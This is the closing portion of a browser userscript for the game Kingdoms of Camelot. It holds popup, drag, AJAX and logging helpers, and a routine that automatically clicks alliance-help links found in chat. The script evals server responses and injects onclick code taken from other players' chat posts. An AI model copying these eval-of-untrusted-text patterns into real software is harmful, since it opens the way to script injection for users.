    return 'friendly';
  if (unsafeWindow.seed.allianceDiplomacies.hostile && unsafeWindow.seed.allianceDiplomacies.hostile['a'+aid] != null)
    return 'hostile';
  return 'neutral';
};
/************  LIB classes/functions .... **************/
function parseIntNan (n){
  x = parseInt(n, 10);
  if (isNaN(x))
    return 0;
  return x; 
}

  function searchDOM (node, condition, maxLevel, doMult){
    var found = [];
    eval ('var compFunc = function (node) { return ('+ condition +') }');
    doOne(node, 1);
    if(!doMult){
      if (found.length==0)
        return null;
      return found[0];
    }
    return found;
    function doOne (node, curLevel){
      try {
        if (compFunc(node))
          found.push(node);
      } catch (e){
      }      
      if (!doMult && found.length>0)
        return; 
      if (++curLevel<maxLevel && node.childNodes!=undefined)
        for (var c=0; c<node.childNodes.length; c++)
          doOne (node.childNodes[c], curLevel);
    }
  }

function getClientCoords(e){
  if (e==null)
    return {x:null, y:null, width:null, height:null};
  var x=0, y=0;
  ret = {x:0, y:0, width:e.clientWidth, height:e.clientHeight};
  while (e.offsetParent != null){
    ret.x += e.offsetLeft;
    ret.y += e.offsetTop;
    e = e.offsetParent;
  }
  return ret;
}

// creates a 'popup' div
function CPopup (prefix, x, y, width, height, enableDrag, onClose) {
  // protos ...
  
  this.BASE_ZINDEX = 8101;
  
   if (unsafeWindow.cpopupWins == null)
        unsafeWindow.cpopupWins = {};
    unsafeWindow.cpopupWins[prefix] = this;
    
  this.stmaxh = height;
  this.show = show;
  this.toggleHide = toggleHide;
  this.getTopDiv = getTopDiv;
  this.getMainDiv = getMainDiv;
  this.getZindex = getZindex;
  this.setZindex = setZindex;
  this.setEnableDrag = setEnableDrag;
  this.getLocation = getLocation;
  this.setLocation = setLocation;
  this.focusMe = focusMe;
  this.unfocusMe = unfocusMe;
  this.centerMe = centerMe;
  this.destroy = destroy;
  this.autoHeight = autoHeight;
  
  // object vars ...
  this.div = document.createElement('div');
  this.prefix = prefix;
  this.onClose = onClose;
  
  var t = this;
  this.div.className = 'CPopup '+ prefix +'_CPopup';
  this.div.style.background = "#fff";
  this.div.style.zIndex = this.BASE_ZINDEX;        // KOC modal is 100210 ?
  this.div.style.display = 'none';
  this.div.style.width = width + 'px';
  this.div.style.height = height + 'px';
  this.div.style.maxHeight = height + 'px';
  this.div.style.overflowY = 'hidden';
  this.div.style.position = "absolute";
  this.div.style.top = y +'px';
  this.div.style.left = x + 'px';
  
    
  var m = '<TABLE cellspacing=0 width=100% height=100%><TR id="'+ prefix +'_bar" class="CPopupTop"><TD id="'+ prefix +'_top" width=99%></td>\
      <TD id='+ prefix +'_X align=right valign=middle onmouseover="this.style.cursor=\'pointer\'" style="color: #fff; background: #555; padding-left: 5px; padding-right: 5px; height:15px;">X</td></tr>\
      <TR><TD valign=top class="CPopMain '+ prefix +'_CPopMain" colspan=2 id="'+ prefix +'_main"></td></tr></table>';
  document.body.appendChild(this.div);
  this.div.innerHTML = m;
  document.getElementById(prefix+'_X').addEventListener ('click', new CeventXClose(this).handler, false);
  this.dragger = new CWinDrag (document.getElementById(prefix+'_bar'), this.div, enableDrag);

  this.div.addEventListener ('mousedown', e_divClicked, false);

  function autoHeight (onoff){
     if (onoff) {
       t.div.style.height = '';  
       t.div.style.maxHeight ='';
    } else{
       t.div.style.height = t.stmaxh;
       t.div.style.maxHeight = t.stmaxh;
       }
  }
  
  function e_divClicked (){
    t.focusMe();
  }  
  function CeventXClose (that){
    var t = that;
    this.handler=handler;
    function handler (){
      t.show(false);
      if (t.onClose != null)
        t.onClose();
    }
  }
  
  function focusMe (){
   //alert((this.BASE_ZINDEX + 5));
    t.div.style.zIndex = (this.BASE_ZINDEX + 5);
    for (k in unsafeWindow.cpopupWins){
      if (k != t.prefix)
        unsafeWindow.cpopupWins[k].unfocusMe(); 
    }
  }
    function destroy (){
      document.body.removeChild(t.div);
      //WinManager.delete (t.prefix);
  }
  
  function centerMe (parent){
      if (parent == null){
        var coords = getClientCoords(document.body);
      } else
        var coords = getClientCoords(parent);
      var x = ((coords.width - parseInt(t.div.style.width)) / 2) + coords.x;
      var y = ((coords.height - parseInt(t.div.style.height)) / 2) + coords.y;
      if (x<0)
        x = 0;
      if (y<0)
        y = 0;
      t.div.style.left = x +'px';
      t.div.style.top = y +'px';
  }
  function unfocusMe (){
    //alert((this.BASE_ZINDEX - 5));
    t.div.style.zIndex = ''+ (this.BASE_ZINDEX - 5);
  }
  function getLocation (){
    return {x: parseInt(this.div.style.left), y: parseInt(this.div.style.top)};
  }

  function setLocation (loc){
    t.div.style.left = loc.x +'px';
    t.div.style.top = loc.y +'px';
  }

  function setEnableDrag (tf){
    t.dragger.setEnable(tf);
  }
  function setLayer(zi){
    t.div.style.zIndex = this.BASE_ZINDEX + zi;
  }
  function getLayer(){
    return parseInt(t.div.style.zIndex) - this.BASE_ZINDEX;
  }
  function setZindex(zi){
    this.div.style.zIndex = ''+zi;
  }

  function getZindex(){
    return parseInt(this.div.style.zIndex);
  }

  function getTopDiv(){
    return document.getElementById(this.prefix+'_top');
  }

  function getMainDiv(){
    return document.getElementById(this.prefix+'_main');
  }
    function getMainTopDiv(){
    	return document.getElementById(this.prefix+'_top');
  }
  function isShown (){
    return t.div.style.display == 'block';
  }
  function show(tf){
     if (tf){
       t.div.style.display = 'block';
       t.focusMe ();
     } else {
       t.div.style.display = 'none';
     }
     return tf;
   }
   function toggleHide(t){
     if (t.div.style.display == 'block') {
       return t.show (false);
     } else {
       return t.show (true);
     }
  }
}
function CWinDrag (clickableElement, movingDiv, enabled) {
  var t=this;
  this.setEnable = setEnable;
  this.setBoundRect = setBoundRect;
  this.debug = debug;
  this.dispEvent = dispEvent;
  this.lastX = null;
  this.lastY = null;
  this.enabled = true;
  this.moving = false;
  this.theDiv = movingDiv;
  this.body = document.body;
  this.ce = clickableElement;
  this.moveHandler = new CeventMove(this).handler;
  this.outHandler = new CeventOut(this).handler;
  this.upHandler = new CeventUp(this).handler;
  this.downHandler = new CeventDown(this).handler;
  this.clickableRect = null;
  this.boundRect = null;
  this.bounds = null;
  this.enabled = false;
  if (enabled == null)
    enabled = true;
  this.setEnable (enabled);

  function setBoundRect (b){    // this rect (client coords) will not go outside of current body
    this.boundRect = boundRect;
    this.bounds = null;
  }

  function setEnable (enable){
    if (enable == t.enabled)
      return;
    if (enable){
      clickableElement.addEventListener('mousedown',  t.downHandler, false);
      t.body.addEventListener('mouseup', t.upHandler, false);
    } else {
      clickableElement.removeEventListener('mousedown', t.downHandler, false);
      t.body.removeEventListener('mouseup', t.upHandler, false);
    }
    t.enabled = enable;
  }

  function CeventDown (that){
    this.handler = handler;
    var t = that;
    function handler (me){
      if (t.bounds == null){
        t.clickableRect = getClientCoords(clickableElement);
        t.bodyRect = getClientCoords(document.body);
        if (t.boundRect == null)
          t.boundRect = t.clickableRect;
        t.bounds = {top:10-t.clickableRect.height, bot:t.bodyRect.height-25, left:40-t.clickableRect.width, right:t.bodyRect.width-25};
      }
      if (me.button==0 && t.enabled){
        t.body.addEventListener('mousemove', t.moveHandler, true);
        t.body.addEventListener('mouseout', t.outHandler, true);
        t.lastX = me.clientX;
        t.lastY = me.clientY;
        t.moving = true;
      }
    }
  }

  function CeventUp  (that){
    this.handler = handler;
    var t = that;
    function handler (me){
      if (me.button==0 && t.moving)
        _doneMoving(t);
    }
  }

  function _doneMoving (t){
    t.body.removeEventListener('mousemove', t.moveHandler, true);
    t.body.removeEventListener('mouseout', t.outHandler, true);
    t.moving = false;
  }

  function CeventOut  (that){
    this.handler = handler;
    var t = that;
    function handler (me){
//t.dispEvent ('eventOUT', me);
      if (me.button==0){
        t.moveHandler (me);
      }
    }
  }

  function CeventMove (that){
    this.handler = handler;
    var t = that;
    function handler (me){
      if (t.enabled && !t.wentOut){
//t.dispEvent ('eventMOVE', me);
        var newTop = parseInt(t.theDiv.style.top) + me.clientY - t.lastY;
        var newLeft = parseInt(t.theDiv.style.left) + me.clientX - t.lastX;
        if (newTop < t.bounds.top){     // if out-of-bounds...
          newTop = t.bounds.top;
          _doneMoving(t);
        } else if (newLeft < t.bounds.left){
          newLeft = t.bounds.left;
          _doneMoving(t);
        } else if (newLeft > t.bounds.right){
          newLeft = t.bounds.right;
          _doneMoving(t);
        } else if (newTop > t.bounds.bot){
          newTop = t.bounds.bot;
          _doneMoving(t);
        }
        t.theDiv.style.top = newTop + 'px';
        t.theDiv.style.left = newLeft + 'px';
        t.lastX = me.clientX;
        t.lastY = me.clientY;
      }
    }
  }

  function debug  (msg, e){
    logit ("*************** "+ msg +" ****************");
    logit ('clientWidth, Height: '+ e.clientWidth +','+ e.clientHeight);
    logit ('offsetLeft, Top, Width, Height (parent): '+ e.offsetLeft +','+ e.offsetTop +','+ e.offsetWidth +','+ e.offsetHeight +' ('+ e.offsetParent +')');
    logit ('scrollLeft, Top, Width, Height: '+ e.scrollLeft +','+ e.scrollTop +','+ e.scrollWidth +','+ e.scrollHeight);
  }

  function dispEvent (msg, me){
    logit (msg + ' Button:'+ me.button +' Screen:'+ me.screenX +','+ me.screenY +' client:'+  me.clientX +','+ me.clientY +' rTarget: '+ me.relatedTarget);
  }
}


function inspect(obj, maxLevels, level, doFunctions){
  var str = '', type, msg;
  if(level == null)  level = 0;
  if(maxLevels == null) maxLevels = 1;
  if(maxLevels < 1)
      return 'Inspect Error: Levels number must be > 0';
  if(obj == null)
    return 'ERROR: Object is NULL\n';
  var indent = '';
  for (var i=0; i<level; i++)
    indent += '  ';
  for(property in obj) {
    try {
        type =  matTypeof(obj[property]);
        if (doFunctions==true && (type == 'function')){
          str += indent + '(' + type + ') ' + property + "[FUNCTION]\n";
        } else if (type != 'function') {
          str += indent + '(' + type + ') ' + property + ( (obj[property]==null)?(': null'):('')) +' = '+ obj[property] +"\n";
        }
        if((type=='object' || type=='array') && (obj[property] != null) && (level+1 < maxLevels))
          str += inspect(obj[property], maxLevels, level+1, doFunctions);  // recurse
    }
    catch(err) {
      // Is there some properties in obj we can't access? Print it red.
      if(typeof(err) == 'string') msg = err;
      else if(err.message)        msg = err.message;
      else if(err.description)    msg = err.description;
      else                        msg = 'Unknown';
      str += '(Error) ' + property + ': ' + msg +"\n";
    }
  }
  str += "\n";
  return str;
}

Array.prototype.compare = function(testArr) {
    if (this.length != testArr.length) return false;
    for (var i = 0; i < testArr.length; i++) {
        if (this[i].compare) { 
            if (!this[i].compare(testArr[i])) return false;
        }
        if (this[i] !== testArr[i]) return false;
    }
    return true;
}

String.prototype.entityTrans = { '&':'&amp;', '<':'&lt;',  '>':'&gt;',  '\"':'&quot;' };
String.prototype.htmlEntities = function() {
  var ret = this.toString();
  for (k in this.entityTrans)
     ret  = ret.split(k).join(this.entityTrans[k]);
  return ret;
}

String.prototype.stripTags = function(){ 
  return this.replace(/<\w+(\s+("[^"]*"|'[^']*'|[^>])+)?>|<\/\w+>/gi, '');
}

String.prototype.capitalize = function(){ 
  return this.charAt(0).toUpperCase() + this.substring(1).toLowerCase();
}

function objectName (o){
  var s = o.toString();
  return s.substr(7,s.length-8);
}

function matTypeof (v){
  if (v == undefined)
    return 'undefined';
  if (typeof (v) == 'object'){
    if (!v)
      return 'null';
    else if (v.constructor.toString().indexOf("Array")>=0 && typeof(v.splice)=='function')
      return 'array';
    else return 'object';
  }
  return typeof (v);
}

function addCommasInt(n){
  nStr = parseInt(n) + '';
  var rgx = /(\d+)(\d{3})/;
  while (rgx.test(nStr)) {
    nStr = nStr.replace(rgx, '$1' + ',' + '$2');
  }
  return nStr;
}

function addCommas(nStr){
  nStr += '';
  x = nStr.split('.');
  x1 = x[0];
  x2 = x.length > 1 ? '.' + x[1] : '';
  var rgx = /(\d+)(\d{3})/;
  while (rgx.test(x1)) {
    x1 = x1.replace(rgx, '$1' + ',' + '$2');
  }
  return x1 + x2;
}


function htmlSelector (valNameArray, curVal, tags){
  m = [];
  m.push ('<SELECT');
  if (tags){
    m.push (' ');
    m.push (tags);
  }  
  for (k in valNameArray){
    m.push ('><OPTION ');
    if (k == curVal)
      m.push ('SELECTED ');
    m.push ('value="');
    m.push (k);
    m.push ('">');
    m.push (valNameArray[k]);
    m.push ('</option>');
  }
  m.push ('</select>');
  return m.join ('');

}


function unixTime (){
  return parseInt (new Date().getTime() / 1000) + unsafeWindow.g_timeoff;
}
function htmlOptions (a, curVal){
  m = '';
  for (k in a)
    m += '<OPTION value="'+ k +'"'+ (k==curVal?' SELECTED':'')  +'>'+ a[k] +'</option>';
  return m;
}
function getFunctionName (func){
  var name=/\W*function\s+([\w\$]+)\(/.exec(func);
  if (!name)
    return '';
  return name[1];
}

function findAllBetween (txt, find1, find2){
  var m = [];
  var last = 0;
  while ( (i1=txt.indexOf(find1, last))>=0 && (i2=txt.indexOf (find2, i1))>=0 ) {
    m.push (txt.substring(i1+find1.length, i2));
    last = i2 + find2.length;
  }
  return m;
}

function strUpTo (s, find){
  var i = s.indexOf(find);
  if (i > 0)
    return s.substr(0, i);
  return s;
}



function timestrShort(time) {
  time = parseInt (time);
  if (time > 86400){
    var m = [];
    time /= 3600;
    m.push (parseInt(time/24)); 
    m.push ('d ');
    m.push (parseInt(time%24)); 
    m.push ('h ');
    return m.join ('');    
  } else
    return timestr (time);
}

function timestr(time, full) {
  time = parseInt (time);
  var m = [];
  var t = time;
  if (t < 61)
    return  t + 's';
  if (t > 86400){
    m.push (parseInt(t/86400)); 
    m.push ('d ');
    t %= 86400;
  }  
  if (t>3600 || time>3600){
    m.push (parseInt(t/3600)); 
    m.push ('h ');
    t %= 3600;
  }  
  m.push (parseInt(t/60)); 
  m.push ('m');
  if (full || time<=3600 ){
    m.push (' ');
    m.push (t%60);
    m.push ('s');  
  }
  return m.join ('');
}

// emulate protoype's Ajax.Request ...
function AjaxRequest (url, opts){
  var headers = {
    'X-Requested-With': 'XMLHttpRequest',
    'X-Prototype-Version': '1.7',
    'Accept': 'text/javascript, text/html, application/xml, text/xml, */*'
  };
  var ajax = null;
    
  if (window.XMLHttpRequest)
    ajax=new XMLHttpRequest();
  else
    ajax=new ActiveXObject("Microsoft.XMLHTTP");
  
  if (opts.method==null || opts.method=='')
    method = 'GET';
  else
    method = opts.method.toUpperCase();  
    
  if (method == 'POST'){
    headers['Content-type'] = 'application/x-www-form-urlencoded; charset=UTF-8';
  } else if (method == 'GET'){
    addUrlArgs (url, opts.parameters);
  }

  ajax.onreadystatechange = function(){
//  ['Uninitialized', 'Loading', 'Loaded', 'Interactive', 'Complete']; states 0-4
    if (ajax.readyState==4) {
      if (ajax.status >= 200 && ajax.status < 305)
        if (opts.onSuccess) opts.onSuccess(ajax);
      else
        if (opts.onFailure) opts.onFailure(ajax);
    } else {
      if (opts.onChange) opts.onChange (ajax);
    }
  }  
    
  ajax.open(method, url, true);   // always async!

  for (var k in headers)
    ajax.setRequestHeader (k, headers[k]);
  if (matTypeof(opts.requestHeaders)=='object')
    for (var k in opts.requestHeaders)
      ajax.setRequestHeader (k, opts.requestHeaders[k]);
      
  if (method == 'POST'){
    var a = [];
    for (k in opts.parameters)
      a.push (k +'='+ opts.parameters[k] );
    ajax.send (a.join ('&'));
  } else               {
    ajax.send();
  }
}   

function MyAjaxRequest (url, o, noRetry){

  var opts = unsafeWindow.Object.clone(o);
  var wasSuccess = o.onSuccess;
  var wasFailure = o.onFailure;
  var retry = 0;
  var delay = 5;
  var noRetry = noRetry===true?true:false;
  opts.onSuccess = mySuccess;
  opts.onFailure = myFailure;


  new AjaxRequest(url, opts);
  return;

  function myRetry(){
    ++retry;
    new AjaxRequest(url, opts);
    delay = delay * 1.25;
  }

  function myFailure(){
    var o = {};
    o.ok = false;
    o.errorMsg = "AJAX Communication Failure";
    wasFailure (o);
  }

  function mySuccess (msg){
    var rslt = eval("(" + msg.responseText + ")");
    var x;
    if (rslt.ok){
      rslt.errorMsg = null;   ///// !!!!!!!!!!!!!  ************
      if (rslt.updateSeed)
        unsafeWindow.update_seed(rslt.updateSeed);
      wasSuccess (rslt);
      return;
    }
    rslt.errorMsg = rslt.error_code ; //unsafeWindow.printLocalError((rslt.error_code || null), (rslt.msg || null), (rslt.feedback || null));
    //if ( (x = rslt.errorMsg.indexOf ('<br><br>')) > 0)
    //  rslt.errorMsg = rslt.errorMsg.substr (0, x-1);
    if (!noRetry && (rslt.error_code==0 ||rslt.error_code==8 || rslt.error_code==1 || rslt.error_code==3)){
      //dialogRetry (rslt.errorMsg, delay, function(){myRetry()}, function(){wasSuccess (rslt)});
    } else {
      wasSuccess (rslt);
    }
  }
}


function cityStatusString (cs){
  if (cs==4)
    return 'Vacances';
  if (cs==3)
    return 'Truce';
  if (cs==2)
    return 'Beg Protection';
  return 'Normal';
}   
function officerId2String (oid){
  if (oid==null)
    return '';
  else if (oid==3)
    return 'Officer';
  else if (oid==2)
    return 'Vice Chance';
  else if (oid==1)
    return 'Chancellor';
  return '';
}

/************  LIB singletons .... **************/
// TODO: fix REopening window
var WINLOG_MAX_ENTRIES = 1000;     // TODO
var WinLog = {
  state : null,
  win: null,
  eOut : null,
  lastE : null,
  enabled : true,
  reverse : true,
  busy : false,
isOpening : false,

  open : function (){
    var t = WinLog;

    function eventButClear(){
      var t = WinLog;
      t.lastE = null;
      t.eOut.innerHTML ='';
    }
    function eventButReverse(){
      var t = WinLog;
      if (t.busy)
        return;
      t.busy = true;
      if (t.reverse){
        t.win.document.getElementById('wlRev').value= 'Top';
        t.reverse = false;
      } else{
        t.win.document.getElementById('wlRev').value= 'Bottom';
        t.reverse = true;
      }
      var n = t.eOut.childNodes.length;
      if (n < 2)
        return;
      for (i=n-2; i>=0; i--){
        t.eOut.appendChild (t.eOut.childNodes[i]);
      }
      t.busy = false;
    }
    
    if (!t.win || t.win.closed){
t.isOpening = true;  
// Firefox bug??? It appears as if a new thread is started on open, withOUT reusing same window
      t.win = window.open('', 'uwtrace', 'top=30,left=0,width=900,height=700,scrollbars=no,location=no,menubar=no,directories=no,status=no');
t.isOpening = false; 
t.state = null; 
    }
    
    if (t.state == null){
      t.win.document.body.innerHTML = '<STYLE>pre{margin:0px} hr{margin:3px; height:1px; border:0px; color:#cee; background-color:#cee}</style>\
        <BODY style="margin:0px; padding:0px; border:none">\
        <DIV id=winlogtop style="background-color:#d0d0d0; margin:0px; padding:0px; border:1px solid">\
        <INPUT id=wlClear type=submit value="Clear"> &nbsp; <INPUT id=wlRev type=submit value="Bottom"></div>\
        <DIV id=wlOut style="overflow-y:auto; height:100%; max-height:100%"></div></body>';
      t.win.document.getElementById('wlClear').addEventListener('click', eventButClear, false);
      t.win.document.getElementById('wlRev').addEventListener('click', eventButReverse, false);
      t.eOut =  t.win.document.getElementById('wlOut');
	  t.lastE = null;
      t.state = 1;
    }
  },
  writeText : function (msg){
    WinLog.write (msg.htmlEntities()); 
  },
  write : function (msg){
    var t = WinLog;
    if (!t.enabled || t.isOpening)
      return;
    t.open();
    var te = document.createElement('pre');
    var now = new Date();
    var m = [];
    var millis = now.getMilliseconds();
    m.push (now.toTimeString().substring (0,8));
    m.push ('.');
    if (millis<100)
      m.push('0');
    if (millis<10)
      m.push('0');
    m.push(millis);
    m.push (': ');
    m.push (msg);
    te.innerHTML = m.join('');

    if (t.reverse){
      if (t.lastE == null){
        t.eOut.appendChild(te);
        t.lastE = te;
      } else {
        t.eOut.insertBefore(te, t.lastE);
      }
      var hr = document.createElement('hr');
      t.eOut.insertBefore(hr, te);
      t.lastE = hr;
    } else {
      t.eOut.appendChild(te);
      t.eOut.appendChild(document.createElement('hr'));
    }
  },
};

function ById(id) {
	return document.getElementById(id);
}

function addCommasWhole(nStr){
  nStr += '';
  x = nStr.split('.');
  x1 = x[0];
  x2 = x.length > 1 ? '.' + x[1] : '';
  var rgx = /(\d+)(\d{3})/;
  while (rgx.test(x1)) {
    x1 = x1.replace(rgx, '$1' + ',' + '$2');
  }
  return x1;
}

function SelectAll(id)
{
 document.getElementById(id).focus();document.getElementById(id).select();
} 




function HandleChatPane() {
	var DisplayName = GetDisplayName();
	var AllianceChatBox=document.getElementById('mod_comm_list2');
	if(AllianceChatBox){
		var chatPosts = document.evaluate(".//div[contains(@class,'chatwrap')]", AllianceChatBox, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null );
		if(chatPosts){
			for (var i = 0; i < chatPosts.snapshotLength; i++) {
				thisPost = chatPosts.snapshotItem(i);
				if(true){
				//if(this.options.autoHelpAlliance){
				
				var postAuthor = document.evaluate('.//*[@class="nm"]', thisPost, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null );
				if(Options.HelpRequest){
				 if(postAuthor.snapshotItem(0)){
						var postAuthorName = postAuthor.snapshotItem(0).innerHTML;
						if(postAuthorName != DisplayName){
							var helpAllianceLinks=document.evaluate(".//a[contains(@onclick,'Chat.helpAlliance')]", thisPost, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null );  
							if(helpAllianceLinks){
								for (var j = 0; j < helpAllianceLinks.snapshotLength; j++) {
									thisLink = helpAllianceLinks.snapshotItem(j);
									var alreadyClicked = thisLink.getAttribute("clicked");
									if(!alreadyClicked){
										thisLink.setAttribute('clicked', 'true');
										var myregexp = /(Chat.helpAlliance\(.*\);)/;
										var match = myregexp.exec(thisLink.getAttribute("onclick"));
										if (match != null) {
											onclickCode = match[0];
											if(true){
												DoUnsafeWindow(onclickCode);
												AddToCommandHistory(onclickCode, 'alliance_help');
											}
										}
									}
								}
							}
						}
					}
				 }
				}
				// Hide alliance requests in chat
				if(Options.DeleteRequest){
					var helpAllianceLinks=document.evaluate(".//a[contains(@onclick,'Chat.helpAlliance')]", thisPost, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null );
					if(helpAllianceLinks){
						for (var j = 0; j < helpAllianceLinks.snapshotLength; j++) {
							thisLink = helpAllianceLinks.snapshotItem(j);
							thisLink.parentNode.parentNode.parentNode.parentNode.removeChild(thisLink.parentNode.parentNode.parentNode);
						}
					}
				}
				// Hide alliance reports in chat
				if(Options.DeleteRequest){
					var myregexp1 = /sur 5 joueurs aidant/i;
					var myregexp2 = /dans ce projet./i;
					var myregexp3 = /Impossible d\'apporter de l\'aide pour l\'instant/i;
					var myregexp4 = /5 personnes ont d/i;
					if (thisPost.innerHTML.match(myregexp1) || thisPost.innerHTML.match(myregexp2) || thisPost.innerHTML.match(myregexp3) || thisPost.innerHTML.match(myregexp4)) {
						thisPost.parentNode.removeChild(thisPost);
					}
				}
			}	
		}	
	}
}	


function GetCommandHistory(history_log_name) {
	if(!history_log_name){
		var history_log_name = "default";
	}
	var json= "";
	if(json=='') json='{}';
	var json_object=JSON2.parse(json);
	if(!json_object['items']){
		json_object['items'] = Array();
	}
	return json_object;
}

function AddToCommandHistory(command_string, history_log_name, log_length_limit) {
	if(!command_string){ return false; }
	if(!history_log_name){ var history_log_name = "default"; }
	// Default to a history length of 20 commands
	if(!log_length_limit){ var log_length_limit = 20; }
	// Get the previous history of commands
	var previous_commands = GetCommandHistory(history_log_name);
	var items = previous_commands['items'];
	// Add the new command
	items.push(command_string);
	// Limit the history length
	if(items.length>log_length_limit){
		items = items.slice(items.length-log_length_limit);
	}
	previous_commands['items'] = items;
	//alert(history_log_name +' - '+JSON2.stringify(previous_commands));
	//History.push = {log_name_history_log_name,JSON2.stringify(previous_commands)};
	//alert(History.toSource());
}		

function FindInCommandHistory(command_string, history_log_name) {
	if(!command_string){ return false; }
	if(!history_log_name){ var history_log_name = "default"; }
	// Get the previous history of commands
	var previous_commands = GetCommandHistory(history_log_name);
	var items = previous_commands['items'];
	for(var i=0; i<items.length; i++){
		if(items[i] == command_string){
			return true;
		}
	}
	return false;
}
		
		
function DoUnsafeWindow(func, execute_by_embed) {
	if(this.isChrome || execute_by_embed) {
		var scr=document.createElement('script');
		scr.innerHTML=func;
		document.body.appendChild(scr);
	} else {
		try {  
			eval("unsafeWindow."+func);
		} catch (error) {
			this.Log("A javascript error has occurred when executing a function via DoUnsafeWindow. Error description: "+error.description);
		}
	}
}	


function GetDisplayName(){
	var DisplayName = document.getElementById('topnavDisplayName');
	if(DisplayName){
		DisplayName = DisplayName.innerHTML;
	}else{
		DisplayName = null;
	}
	return DisplayName
}


String.prototype.StripQuotes = function() {
	return this.replace(/"/g,'');
};

ptStartup (); 

